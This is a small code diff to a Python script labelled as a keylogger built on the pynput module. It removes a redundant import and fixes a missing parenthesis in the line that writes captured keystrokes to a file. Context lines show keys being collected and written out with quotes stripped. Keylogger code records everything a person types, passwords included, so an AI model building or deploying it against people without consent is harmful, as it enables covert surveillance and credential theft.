@@ -1,6 +1,5 @@
 # keylogger using pynput module
 
-import pynput
 from pynput.keyboard import Key, Listener
 
 keys = []
@@ -23,7 +22,7 @@ def write_file(keys):
 			
 			# removing ''
 			k = str(key).replace("'", "")
-			f.write(k
+			f.write(k)
 					
 			# explicitly adding a space after
 			# every keystroke for readability
